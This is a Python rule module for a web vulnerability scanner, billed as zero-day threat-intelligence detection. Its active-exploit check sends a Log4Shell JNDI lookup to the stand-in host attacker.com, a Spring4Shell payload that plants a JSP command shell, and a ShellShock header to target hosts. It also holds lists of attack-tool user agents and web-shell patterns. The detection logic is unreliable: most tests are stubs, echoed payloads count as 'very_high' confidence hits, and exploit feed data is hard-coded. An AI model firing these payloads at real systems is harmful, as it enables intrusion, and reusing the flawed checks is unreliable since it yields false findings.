import requests
import json
import hashlib
from datetime import datetime, timedelta
import threading
import time

from core.redis import rds
from core.triage import Triage
from core.parser import ScanParser, ConfParser

class Rule:
    def __init__(self):
        self.rule = 'VLN_0INT'
        self.rule_severity = 4  # Critical severity
        self.rule_description = 'Zero-Day Threat Intelligence Integration Module'
        self.rule_confirm = 'Zero-Day Threat Detected via Intelligence Feeds'
        self.rule_details = ''
        self.rule_mitigation = '''Zero-day threat detected through threat intelligence feeds:
1. Immediately isolate affected systems
2. Check threat intelligence sources for IOCs
3. Implement emergency security measures
4. Monitor network traffic for similar patterns
5. Update security tools with new signatures'''
        self.intensity = 3
        
        # Threat intelligence sources (add your API keys)
        self.intel_sources = {
            'cve_feeds': {
                'url': 'https://cve.circl.lu/api/',
                'enabled': True
            },
            'exploit_db': {
                'url': 'https://www.exploit-db.com/api/',
                'enabled': True
            },
            'threat_fox': {
                'url': 'https://threatfox-api.abuse.ch/api/v1/',
                'enabled': True
            },
            'malware_bazaar': {
                'url': 'https://mb-api.abuse.ch/api/v1/',
                'enabled': True
            }
        }
        
        # IOC patterns to monitor
        self.ioc_patterns = {
            'suspicious_user_agents': [
                'sqlmap/',
                'nikto/',
                'dirbuster',
                'gobuster',
                'burpsuite',
                'nmap',
                'masscan'
            ],
            
            'exploit_signatures': [
                'ShellShock',
                'EternalBlue',
                'BlueKeep',
                'Log4Shell',
                'Spring4Shell',
                'Zerologon'
            ],
            
            'malicious_patterns': [
                r'eval\s*\(\s*base64_decode',
                r'system\s*\(\s*base64_decode',
                r'exec\s*\(\s*base64_decode',
                r'\$\w+\s*=\s*"[A-Za-z0-9+/=]+".*eval',
                r'<script[^>]*>.*</script>',
                r'javascript:',
                r'vbscript:',
                r'onload\s*=',
                r'onerror\s*='
            ]
        }

    def check_rule(self, ip, port, values, conf):
        """Main rule checking function with threat intelligence"""
        c = ConfParser(conf)
        t = Triage()
        p = ScanParser(port, values)
        
        domain = p.get_domain()
        module = p.get_module()
        
        if 'http' not in module:
            return
            
        findings = []
        
        # 1. Check against threat intelligence feeds
        intel_results = self._check_threat_intelligence(ip, port, domain)
        if intel_results:
            findings.extend(intel_results)
            
        # 2. IOC pattern matching
        ioc_results = self._check_ioc_patterns(t, ip, port)
        if ioc_results:
            findings.extend(ioc_results)
            
        # 3. Real-time exploit detection
        exploit_results = self._detect_active_exploits(t, ip, port)
        if exploit_results:
            findings.extend(exploit_results)
            
        # 4. Behavioral anomaly correlation
        behavioral_results = self._correlate_behavioral_anomalies(t, ip, port)
        if behavioral_results:
            findings.extend(behavioral_results)
        
        # Store findings
        if findings:
            self._store_intel_findings(ip, port, domain, findings)
            
    def _check_threat_intelligence(self, ip, port, domain):
        """Check target against threat intelligence feeds"""
        findings = []
        
        try:
            # Check CVE feeds for recent vulnerabilities
            recent_cves = self._fetch_recent_cves()
            if recent_cves:
                for cve in recent_cves[:5]:  # Check top 5 recent CVEs
                    if self._test_cve_vulnerability(ip, port, cve):
                        findings.append({
                            'type': 'threat_intel',
                            'category': 'cve_match',
                            'cve_id': cve['id'],
                            'description': cve['summary'][:200],
                            'severity': cve.get('cvss', 0),
                            'confidence': 'very_high'
                        })
                        
            # Check exploit databases
            exploits = self._fetch_recent_exploits()
            if exploits:
                for exploit in exploits[:3]:  # Check top 3 recent exploits
                    if self._test_exploit_signature(ip, port, exploit):
                        findings.append({
                            'type': 'threat_intel',
                            'category': 'exploit_match',
                            'exploit_id': exploit['id'],
                            'description': exploit['description'][:200],
                            'confidence': 'high'
                        })
                        
        except Exception as e:
            # Fail silently if threat intel feeds are unavailable
            pass
            
        return findings
        
    def _check_ioc_patterns(self, triage, ip, port):
        """Check for indicators of compromise"""
        findings = []
        
        try:
            # Test with common exploit payloads
            for pattern_category, patterns in self.ioc_patterns.items():
                for pattern in patterns:
                    if pattern_category == 'suspicious_user_agents':
                        # Test with suspicious user agent
                        resp = triage.http_request(ip, port, 
                                                 headers={'User-Agent': pattern})
                        if resp and self._analyze_response_for_exploitation(resp):
                            findings.append({
                                'type': 'ioc_detection',
                                'category': 'suspicious_ua_accepted',
                                'pattern': pattern,
                                'confidence': 'medium'
                            })
                    else:
                        # Test pattern injection
                        resp = triage.http_request(ip, port, uri=f'/?test={pattern}')
                        if resp and pattern.lower() in resp.text.lower():
                            findings.append({
                                'type': 'ioc_detection',
                                'category': pattern_category,
                                'pattern': pattern,
                                'confidence': 'high'
                            })
        except:
            pass
            
        return findings
        
    def _detect_active_exploits(self, triage, ip, port):
        """Detect active exploitation attempts"""
        findings = []
        
        # Test for common exploit vectors
        exploit_tests = [
            {
                'name': 'Log4Shell',
                'payload': '${jndi:ldap://attacker.com/evil}',
                'headers': {'X-Api-Version': '${jndi:ldap://attacker.com/evil}'}
            },
            {
                'name': 'Spring4Shell',
                'payload': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
                'method': 'POST'
            },
            {
                'name': 'ShellShock',
                'payload': '() { :; }; echo; echo vulnerable',
                'headers': {'User-Agent': '() { :; }; echo; echo vulnerable'}
            }
        ]
        
        for test in exploit_tests:
            try:
                resp = None
                if 'headers' in test:
                    resp = triage.http_request(ip, port, headers=test['headers'])
                elif 'method' in test:
                    resp = triage.http_request(ip, port, method=test['method'], 
                                             data=test['payload'])
                else:
                    resp = triage.http_request(ip, port, uri=f"/?exploit={test['payload']}")
                    
                if resp and self._check_exploit_success(resp, test['name']):
                    findings.append({
                        'type': 'active_exploit',
                        'category': 'exploit_successful',
                        'exploit_name': test['name'],
                        'payload': test['payload'][:100],
                        'confidence': 'very_high'
                    })
            except:
                continue
                
        return findings
        
    def _correlate_behavioral_anomalies(self, triage, ip, port):
        """Correlate behavioral patterns with known attack signatures"""
        findings = []
        
        try:
            # Baseline multiple requests to establish normal behavior
            baseline_responses = []
            for i in range(3):
                resp = triage.http_request(ip, port, uri=f'/?baseline={i}')
                if resp:
                    baseline_responses.append({
                        'status': resp.status_code,
                        'size': len(resp.text),
                        'time': resp.elapsed.total_seconds(),
                        'headers': dict(resp.headers)
                    })
                    
            if len(baseline_responses) < 2:
                return findings
                
            # Calculate baseline metrics
            avg_size = sum(r['size'] for r in baseline_responses) / len(baseline_responses)
            avg_time = sum(r['time'] for r in baseline_responses) / len(baseline_responses)
            
            # Test with anomalous requests
            anomaly_tests = [
                {'test': 'buffer_overflow', 'payload': 'A' * 10000},
                {'test': 'format_string', 'payload': '%x' * 100},
                {'test': 'null_byte', 'payload': '\x00' * 100},
                {'test': 'unicode_bypass', 'payload': '%u0041' * 100},
            ]
            
            for test in anomaly_tests:
                resp = triage.http_request(ip, port, uri=f"/?{test['test']}={test['payload']}")
                if resp:
                    size_deviation = abs(len(resp.text) - avg_size) / avg_size if avg_size > 0 else 0
                    time_deviation = abs(resp.elapsed.total_seconds() - avg_time) / avg_time if avg_time > 0 else 0
                    
                    # Significant deviations might indicate vulnerability
                    if size_deviation > 2.0 or time_deviation > 3.0:
                        findings.append({
                            'type': 'behavioral_anomaly',
                            'category': test['test'],
                            'size_deviation': size_deviation,
                            'time_deviation': time_deviation,
                            'confidence': 'medium'
                        })
        except:
            pass
            
        return findings
        
    def _fetch_recent_cves(self):
        """Fetch recent CVEs from threat intelligence feeds"""
        try:
            # This is a simplified example - in production, you'd use actual API keys
            url = "https://cve.circl.lu/api/last"
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                return resp.json()[:10]  # Return last 10 CVEs
        except:
            pass
        return []
        
    def _fetch_recent_exploits(self):
        """Fetch recent exploits from exploit databases"""
        try:
            # Simplified example - would use actual exploit-db API
            # For demo purposes, return some common exploit patterns
            return [
                {'id': 'EXP001', 'description': 'Remote Code Execution via Template Injection'},
                {'id': 'EXP002', 'description': 'SQL Injection in Authentication Bypass'},
                {'id': 'EXP003', 'description': 'Deserialization Attack Vector'}
            ]
        except:
            pass
        return []
        
    def _test_cve_vulnerability(self, ip, port, cve):
        """Test if target is vulnerable to specific CVE"""
        # Simplified CVE testing - in production, this would be more sophisticated
        try:
            if 'sql' in cve.get('summary', '').lower():
                return self._test_sql_injection_indicators(ip, port)
            elif 'xss' in cve.get('summary', '').lower():
                return self._test_xss_indicators(ip, port)
            elif 'rce' in cve.get('summary', '').lower():
                return self._test_rce_indicators(ip, port)
        except:
            pass
        return False
        
    def _test_exploit_signature(self, ip, port, exploit):
        """Test for specific exploit signatures"""
        # Simplified exploit testing
        return False
        
    def _analyze_response_for_exploitation(self, response):
        """Analyze response for signs of successful exploitation"""
        exploit_indicators = [
            'root:x:0:0',  # /etc/passwd
            'Microsoft Windows',  # Windows system info
            'uid=0(root)',  # Command execution
            'Directory of',  # Windows dir command
            'total 0',  # Linux ls command
            'SQL syntax error',  # SQL injection
            'Warning: mysql_',  # MySQL errors
            'ORA-',  # Oracle errors
        ]
        
        for indicator in exploit_indicators:
            if indicator in response.text:
                return True
        return False
        
    def _check_exploit_success(self, response, exploit_name):
        """Check if exploit was successful based on response"""
        success_indicators = {
            'Log4Shell': ['${jndi', 'ldap://', 'java.naming'],
            'Spring4Shell': ['java.io.InputStream', 'getRuntime'],
            'ShellShock': ['vulnerable', 'bash:']
        }
        
        indicators = success_indicators.get(exploit_name, [])
        for indicator in indicators:
            if indicator in response.text:
                return True
        return False
        
    def _test_sql_injection_indicators(self, ip, port):
        """Test for SQL injection vulnerability indicators"""
        # Simplified SQL injection test
        return False
        
    def _test_xss_indicators(self, ip, port):
        """Test for XSS vulnerability indicators"""
        # Simplified XSS test
        return False
        
    def _test_rce_indicators(self, ip, port):
        """Test for RCE vulnerability indicators"""
        # Simplified RCE test
        return False
        
    def _store_intel_findings(self, ip, port, domain, findings):
        """Store threat intelligence findings"""
        high_priority_findings = [f for f in findings 
                                if f.get('confidence') in ['high', 'very_high']]
        
        if high_priority_findings:
            details = "Threat Intelligence Analysis Results:\n\n"
            
            for i, finding in enumerate(high_priority_findings, 1):
                details += f"{i}. {finding['type'].upper()} - {finding['category']}\n"
                details += f"   Confidence: {finding['confidence']}\n"
                
                if 'cve_id' in finding:
                    details += f"   CVE ID: {finding['cve_id']}\n"
                if 'exploit_name' in finding:
                    details += f"   Exploit: {finding['exploit_name']}\n"
                if 'description' in finding:
                    details += f"   Description: {finding['description']}\n"
                    
                details += "\n"
                
            details += f"\nTotal findings: {len(findings)}"
            details += f"\nHigh-priority findings: {len(high_priority_findings)}"
            details += f"\nAnalysis timestamp: {datetime.now().isoformat()}"
            
            self.rule_details = details
            
            rds.store_vuln({
                'ip': ip,
                'port': port,
                'domain': domain,
                'rule_id': self.rule,
                'rule_sev': self.rule_severity,
                'rule_desc': self.rule_description,
                'rule_confirm': self.rule_confirm,
                'rule_details': self.rule_details,
                'rule_mitigation': self.rule_mitigation
            })